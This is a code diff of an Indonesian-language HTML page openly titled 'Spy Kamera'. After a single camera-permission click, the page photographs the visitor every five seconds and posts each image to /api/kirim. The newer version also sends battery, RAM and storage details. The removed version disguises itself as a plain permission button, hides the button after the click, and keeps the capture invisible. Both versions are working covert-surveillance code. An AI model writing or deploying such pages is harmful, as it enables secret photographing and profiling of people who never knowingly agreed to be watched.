@@ -1,66 +1,59 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>Kamera Aktif</title>
-  <style>
-    body {
-      margin: 0;
-      background: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    #startBtn {
-      padding: 12px 24px;
-      font-size: 16px;
-      cursor: pointer;
-      border: none;
-      background-color: black;
-      color: white;
-      border-radius: 8px;
-    }
-    video, canvas {
-      display: none;
-    }
-  </style>
-</head>
-<body>
-  <button id="startBtn">Izinkan Kamera</button>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Spy Kamera dengan Informasi Detail</title>
+  </head>
+  <body>
+    <h2>Spy Kamera dengan Detail Perangkat</h2>
+    <button id="startButton">Mulai Ambil Gambar</button>
+    <video id="video" autoplay playsinline width="320" height="240"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
-  <video id="video" autoplay playsinline width="320" height="240"></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
+    <script>
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
 
-  <script>
-    const btn = document.getElementById("startBtn");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
-
-    btn.onclick = async () => {
-      try {
+      // Mulai mengakses kamera
+      document.getElementById("startButton").onclick = async () => {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        btn.style.display = "none"; // Sembunyikan tombol
 
-        setInterval(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          ctx.fillStyle = "rgba(0, 0, 0, 0.6)";
-          ctx.font = "16px Arial";
-          ctx.fillText("Dev By @FazrrEdan", 10, 20);
+        // Menyiapkan untuk mengambil foto setiap 5 detik
+        setInterval(async () => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/jpeg");
 
-          const image = canvas.toDataURL("image/jpeg");
+          // Ambil informasi perangkat
+          const deviceInfo = await getDeviceInfo();
 
+          // Kirim gambar beserta informasi perangkat ke server
           fetch("/api/kirim", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ image })
+            body: JSON.stringify({
+              image: imageData,
+              deviceInfo: deviceInfo
+            })
           });
-        }, 5000);
-      } catch (err) {
-        alert("Gagal mengakses kamera: " + err.message);
+        }, 5000); // ambil foto tiap 5 detik
+      };
+
+      // Fungsi untuk mendapatkan informasi detail perangkat
+      async function getDeviceInfo() {
+        const battery = await navigator.getBattery(); // Dapatkan info baterai
+        const ram = navigator.deviceMemory || "Tidak diketahui"; // Dapatkan RAM
+        const storage = await navigator.storage.estimate(); // Dapatkan informasi penyimpanan
+
+        return {
+          batteryLevel: battery.level * 100, // Persentase baterai
+          isCharging: battery.charging ? "Ya" : "Tidak", // Status charging
+          ram: ram + " GB", // RAM
+          totalStorage: storage.quota / (1024 * 1024 * 1024) + " GB", // Penyimpanan total
+          usedStorage: storage.usage / (1024 * 1024 * 1024) + " GB", // Penyimpanan yang digunakan
+        };
       }
-    };
-  </script>
-</body>
+    </script>
+  </body>
 </html>
